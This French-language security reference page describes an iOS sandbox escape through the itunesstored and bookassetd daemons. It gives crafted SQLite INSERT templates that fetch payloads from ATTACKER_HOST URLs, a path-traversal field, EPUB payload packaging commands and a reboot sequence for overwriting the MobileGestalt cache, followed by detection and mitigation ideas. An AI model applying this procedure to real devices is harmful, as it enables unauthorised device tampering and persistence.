# itunesstored & bookassetd Sandbox Escape

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Des recherches récentes montrent que deux daemons préinstallés iOS, **`itunesstored`** (gestionnaire de téléchargements) et **`bookassetd`** (gestionnaire d'assets Books / iBooks), font aveuglément confiance à des métadonnées SQLite écrites par l'utilisateur. En déposant des fichiers `downloads.28.sqlitedb` et `BLDatabaseManager.sqlite` spécialement conçus ainsi qu’une archive EPUB minimale, un attaquant capable d’écrire sous `/var/mobile/Media/` peut contraindre ces daemons à effectuer des **écritures de fichiers arbitraires à travers la plupart des chemins appartenant à `mobile` à l'intérieur de `/private/var/`**. Ces primitives survivent aux redémarrages et permettent de modifier des caches de groupes système tels que `systemgroup.com.apple.mobilegestaltcache` pour usurper des propriétés de l’appareil ou persister une configuration.

Points clés :

- Fonctionne sur des appareils jusqu'au moins **iOS 26.2b1** (testé sur iPhone 12 / iOS 26.0.1).
- Les cibles inscriptibles incluent les caches `SystemGroup`, `/private/var/mobile/Library/FairPlay`, `/private/var/mobile/Media`, et d'autres fichiers appartenant à `mobile`. Les écritures vers des fichiers appartenant à `root` échouent.
- Nécessite uniquement un accès de niveau AFC (copie de fichiers USB) ou tout point d'appui permettant de remplacer les DB SQLite ciblées et téléverser des payloads.

## Modèle de menace et exigences

1. **Accès local au système de fichiers** vers `/var/mobile/Media/Downloads/` et `/var/mobile/Media/Books/` (via des clients AFC comme 3uTools, i4.cn, ou [`afcclient`](https://github.com/emonti/afcclient) over USB, ou toute compromission préalable).
2. **Serveur HTTP** hébergeant les fichiers de l'attaquant (`BLDatabaseManager.sqlite`, `iTunesMetadata.plist`, EPUB fabriqué) exposés via des URLs telles que `https://ATTACKER_HOST/fileprovider.php?type=...`.
3. Capacité à **redémarrer l'appareil plusieurs fois** pour forcer chaque daemon à recharger sa base de données.
4. Connaissance de l'**UUID du SystemGroup Books** afin que l'écriture de l'Étape 1 tombe dans le bon conteneur (trouvé via syslog).

## Étape 1 – Exploitation de `downloads.28.sqlitedb` via `itunesstored`

`itunesstored` traite `/var/mobile/Media/Downloads/downloads.28.sqlitedb`. La table `asset` stocke l'URL + métadonnées de destination et est traitée comme une entrée de confiance. Fabriquer une ligne qui pointe vers une URL de l'attaquant et définit `local_path` sur `.../Documents/BLDatabaseManager/BLDatabaseManager.sqlite` à l'intérieur du SystemGroup Books fait que `itunesstored` télécharge et écrase la base Books avec le contenu de l'attaquant au démarrage.

### Localiser l'UUID du SystemGroup Books

1. Récupérez une archive syslog avec [`pymobiledevice3`](https://github.com/doronz88/pymobiledevice3) :
```bash
pymobiledevice3 syslog collect logs.logarchive
```
2. Ouvrez `logs.logarchive` dans **Console.app** et recherchez `bookassetd [Database]: Store is at file:///private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite`.
3. Notez `<UUID>` et substituez-le dans le payload SQL.

### Ligne `asset` malveillante

<details>
<summary>Modèle d'INSERT pour l'étape 1</summary>
```sql
INSERT INTO "main"."asset" (
"pid","download_id","asset_order","asset_type","bytes_total",
"url","local_path","destination_url","path_extension","retry_count",
"http_method","initial_odr_size","is_discretionary","is_downloaded",
"is_drm_free","is_external","is_hls","is_local_cache_server",
"is_zip_streamable","processing_types","video_dimensions",
"timeout_interval","store_flavor","download_token","blocked_reason",
"avfoundation_blocked","service_type","protection_type",
"store_download_key","etag","bytes_to_hash","hash_type","server_guid",
"file_protection","variant_id","hash_array","http_headers",
"request_parameters","body_data","body_data_file_path","sinfs_data",
"dpinfo_data","uncompressed_size","url_session_task_id"
) VALUES (
1234567890,6936249076851270150,0,'media',NULL,
'https://ATTACKER_HOST/fileprovider.php?type=sqlite',
'/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite',
NULL,'epub',6,'GET',NULL,0,0,0,1,0,0,0,0,
NULL,60,NULL,466440000,0,0,0,0,'',NULL,NULL,0,
NULL,NULL,NULL,X'62706c6973743030a1015f1020...',NULL,NULL,NULL,NULL,NULL,NULL,0,1
);
```
</details>

**Champs importants :**

- `url` : point de terminaison contrôlé par l'attaquant renvoyant le `BLDatabaseManager.sqlite` malveillant.
- `local_path` : fichier `BLDatabaseManager.sqlite` du groupe système Books déterminé ci‑dessus.
- Flags de contrôle : conserver les valeurs par défaut (`asset_type='media'`, `path_extension='epub'`, booléens définis à 0/1 comme dans le modèle) pour que le daemon accepte la tâche.

### Déploiement

1. Supprimer les entrées obsolètes `/var/mobile/Media/Downloads/*` pour éviter les conditions de concurrence.
2. Remplacer `downloads.28.sqlitedb` par la base de données construite via AFC.
3. Redémarrer → `itunesstored` télécharge la base de données de l'Étape 2 et dépose `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
4. Copier ce plist dans `/var/mobile/Media/Books/iTunesMetadata.plist` ; l'Étape 2 l'attend à cet emplacement.

## Étape 2 – Abuser de `BLDatabaseManager.sqlite` via `bookassetd`

`bookassetd` possède des filesystem entitlements plus larges et fait confiance à la table `ZBLDOWNLOADINFO`. En insérant une ligne d'achat factice qui référence des URL contrôlées par l'attaquant et une traversal dans `ZPLISTPATH`, le daemon télécharge votre EPUB vers `/var/mobile/Media/Books/asset.epub` et extrait ensuite les métadonnées dans **n'importe quel chemin appartenant à `mobile` accessible via des séquences d'échappement `../../..`**.

### Ligne `ZBLDOWNLOADINFO` malveillante

<details>
<summary>Modèle INSERT de l'Étape 2</summary>
```sql
INSERT INTO "ZBLDOWNLOADINFO" (
"Z_PK","Z_ENT","Z_OPT","ZACCOUNTIDENTIFIER","ZCLEANUPPENDING",
"ZFAMILYACCOUNTIDENTIFIER","ZISAUTOMATICDOWNLOAD","ZISLOCALCACHESERVER",
"ZISPURCHASE","ZISRESTORE","ZISSAMPLE","ZISZIPSTREAMABLE",
"ZNUMBEROFBYTESTOHASH","ZPERSISTENTIDENTIFIER","ZPUBLICATIONVERSION",
"ZSERVERNUMBEROFBYTESTOHASH","ZSIZE","ZSTATE","ZSTOREIDENTIFIER",
"ZSTOREPLAYLISTIDENTIFIER","ZLASTSTATECHANGETIME","ZPURCHASEDATE",
"ZSTARTTIME","ZARTISTNAME","ZARTWORKPATH","ZASSETPATH",
"ZBUYPARAMETERS","ZCANCELDOWNLOADURL","ZCLIENTIDENTIFIER",
"ZCOLLECTIONARTISTNAME","ZCOLLECTIONTITLE","ZDOWNLOADID",
"ZDOWNLOADKEY","ZENCRYPTIONKEY","ZEPUBRIGHTSPATH","ZFILEEXTENSION",
"ZGENRE","ZHASHTYPE","ZKIND","ZMD5HASHSTRINGS","ZORIGINALURL",
"ZPERMLINK","ZPLISTPATH","ZSALT","ZSUBTITLE","ZTHUMBNAILIMAGEURL",
"ZTITLE","ZTRANSACTIONIDENTIFIER","ZURL","ZRACGUID","ZDPINFO",
"ZSINFDATA","ZFILEATTRIBUTES"
) VALUES (
1,2,3,0,0,0,0,'',NULL,NULL,NULL,NULL,
0,0,0,NULL,4648,2,'765107108',NULL,
767991550.119197,NULL,767991353.245275,NULL,NULL,
'/private/var/mobile/Media/Books/asset.epub',
'productType=PUB&salableAdamId=765107106&...',
'https://p19-buy.itunes.apple.com/...',
'4GG2695MJK.com.apple.iBooks','Sebastian Saenz','Cartas de Amor a la Luna',
'../../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library',
NULL,NULL,NULL,NULL,'Contemporary Romance',NULL,'ebook',NULL,NULL,NULL,
'/private/var/mobile/Media/Books/iTunesMetadata.plist',NULL,
'Cartas de Amor a la Luna','https://ATTACKER_HOST/fileprovider.php?type=gestalt',
'Cartas de Amor a la Luna','J19N_PUB_190099164604738',
'https://ATTACKER_HOST/fileprovider.php?type=gestalt2',NULL,NULL,NULL,NULL
);
```
</details>

Champs importants :

- `ZASSETPATH`: emplacement sur disque de l'EPUB contrôlé par l'attaquant.
- `ZURL`/`ZPERMLINK`: URLs de l'attaquant hébergeant l'EPUB et le plist auxiliaire.
- `ZPLISTPATH`: `../../../../../private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library` – la **path traversal base** appendue aux fichiers extraits de l'EPUB. Ajustez la profondeur de path traversal pour atteindre la cible SystemGroup souhaitée.
- Les métadonnées d'achat (`ZSTOREIDENTIFIER`, noms, horodatages) imitent des entrées légitimes afin que le daemon ne rejette pas la ligne.

Après avoir copié la DB malveillante dans `/private/var/containers/Shared/SystemGroup/<UUID>/Documents/BLDatabaseManager/BLDatabaseManager.sqlite` (grâce à Stage 1) et redémarré deux fois, `bookassetd` va (1) télécharger l'EPUB, (2) le traiter et écrire le plist dérivé sous le chemin traversé.

## Création du EPUB payload

`bookassetd` respecte le format EPUB ZIP : `mimetype` doit être la première entrée non compressée. Pour mapper le contenu EPUB vers le cache MobileGestalt, construisez un arbre de répertoires qui reflète le chemin désiré relatif à `ZPLISTPATH`.
```
Caches/
├── mimetype
└── com.apple.MobileGestalt.plist
```
Créer l'archive :
```bash
zip -X0 hax.epub Caches/mimetype
zip -Xr9D hax.epub Caches/com.apple.MobileGestalt.plist
```
- `mimetype` contient typiquement la valeur littérale `application/epub+zip`.
- `Caches/com.apple.MobileGestalt.plist` contient la payload contrôlée par l'attaquant qui aboutira à `.../Library/Caches/com.apple.MobileGestalt.plist`.

## Flux d'orchestration

1. **Préparer les fichiers** sur le serveur HTTP de l'attaquant et générer les deux bases SQLite avec des valeurs spécifiques à l'hôte/UUID.
2. **Remplacer `downloads.28.sqlitedb`** sur l'appareil et redémarrer → Stage 1 télécharge le `BLDatabaseManager.sqlite` malveillant et émet `/var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist`.
3. **Copier `iTunesMetadata.plist`** vers `/var/mobile/Media/Books/iTunesMetadata.plist` (répéter si le daemon le supprime).
4. **Redémarrer à nouveau** → `bookassetd` télécharge `asset.epub` vers `/var/mobile/Media/Books/` en utilisant les métadonnées du Stage 2.
5. **Redémarrer une troisième fois** → `bookassetd` traite l'asset téléchargé, suit `ZPLISTPATH` et écrit le contenu de l'EPUB dans le chemin SystemGroup ciblé (par ex. `com.apple.MobileGestalt.plist`).
6. **Vérifier** en lisant le plist écrasé ou en observant que les propriétés dérivées de MobileGestalt (identifiant du modèle, flags d'activation, etc.) changent en conséquence.

Le même schéma permet de déposer des fichiers sous d'autres caches possédés par `mobile`, comme l'état FairPlay ou des répertoires de persistance, permettant des altérations furtives sans nécessiter d'exploit kernel.

## Outils et remarques opérationnelles

- **`pymobiledevice3 syslog collect logs.logarchive`** – extraire les archives de logs pour découvrir l'UUID du Books SystemGroup.
- **Console.app** – filtrer sur `bookassetd [Database]: Store is at ...` pour récupérer le chemin exact du conteneur.
- **AFC clients (`afcclient`, 3uTools, i4.cn)** – push/pull des DB SQLite et des fichiers plist via USB sans jailbreak.
- **`zip`** – appliquer les contraintes d'ordre EPUB lors du packaging des payloads.
- **Public PoC** – <https://github.com/hanakim3945/bl_sbx> fournit des templates SQLite/EPUB de base que vous pouvez personnaliser.

## Idées de détection et d'atténuation

- Considérer `downloads.28.sqlitedb` et `BLDatabaseManager.sqlite` comme des entrées non fiables : valider que `local_path` / `ZPLISTPATH` restent dans des sandboxes approuvés et rejeter les chemins qualifiés (fully qualified paths) ou les tokens de traversée.
- Surveiller les écritures AFC qui remplacent ces bases ou les téléchargements inattendus initiés par `itunesstored` / `bookassetd` peu après le boot.
- Renforcer le dépaquetage de `bookassetd` pour appeler `realpath()` sur la cible de sortie et s'assurer qu'il ne peut pas s'échapper du conteneur Books avant d'écrire les fichiers.
- Restreindre les canaux de copie de fichiers AFC / USB ou exiger une interaction utilisateur avant d'autoriser le remplacement des fichiers metadata Books/iTunes.

## Références

- [itunesstored & bookassetd sbx escape](https://hanakim3945.github.io/posts/download28_sbx_escape/)
- [bl_sbx PoC repository](https://github.com/hanakim3945/bl_sbx)

{{#include ../../banners/hacktricks-training.md}}
